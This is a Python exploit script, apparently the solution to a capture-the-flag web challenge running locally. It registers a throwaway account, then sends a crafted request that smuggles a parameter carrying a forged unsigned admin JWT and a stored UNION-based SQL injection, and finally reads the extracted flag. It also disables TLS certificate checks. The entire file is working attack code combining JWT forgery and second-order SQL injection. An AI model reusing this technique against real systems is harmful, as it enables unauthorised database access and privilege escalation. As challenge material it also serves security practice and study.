import base64
import random
import string

import requests

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

BASE_URL = f"https://127.0.0.1"


def register(session: requests.Session, username: str, password: str):
    return session.post(
        f"{BASE_URL}/register", json={"username": username, "password": password}
    )


def login(session: requests.Session, username: str, password: str):
    response = session.post(
        f"{BASE_URL}/login", json={"username": username, "password": password}
    )
    return response.json()["jwt"]


def store_sqli(session: requests.Session, username: str, jwt: str):
    fake_jwt = "x." + base64.urlsafe_b64encode(('{"user": "' + username + '", "role": "admin"}').encode()).decode().replace("=", "")
    payload = ('action": {"name": "updaterating", "params": {"name": "%s", "challenge": "x\' UNION ALL SELECT 1337, flag FROM flag;-- -", "value": 1337}}, "jwt": "%s"}#&#q_=' % (username, fake_jwt,)).replace('"', '%22')
    session.post(f"{BASE_URL}/action", json={
        payload: "x#",
        "action": {
            "name": "memes",
            "params": {
                "challenge": "memes",
                "value": 1
            }
        },
        "jwt": jwt,
    })


def fetch_flag(session: requests.Session, jwt: str):
    response = session.post(f"{BASE_URL}/action", json={
        "action": {
            "name": "getratings",
            "params": {}
        },
        "jwt": jwt,
    })
    return response.json()["data"][-1]["notes"][0]["note"][1:-1]

with requests.Session() as session:
    session.verify = False
    #session.proxies = {"https": "http://127.0.0.1:8081"}
    response = session.get(BASE_URL)
    username = "".join(random.choices(string.ascii_letters, k=12))
    password = "".join(random.choices(string.ascii_letters, k=12))
    print(f"[+] Registering as {username!r} ...")
    register(session, username=username, password=password)
    print(f"[+] Authenticating as {username!r} ...")
    jwt = login(session, username=username, password=password)

    print(f"[+] Sending second-order SQLi ...")
    store_sqli(session, username=username, jwt=jwt)

    print(f"[+] Fetching flag...")
    flag = fetch_flag(session, jwt=jwt)
    print(f"[+] Flag: {flag}")
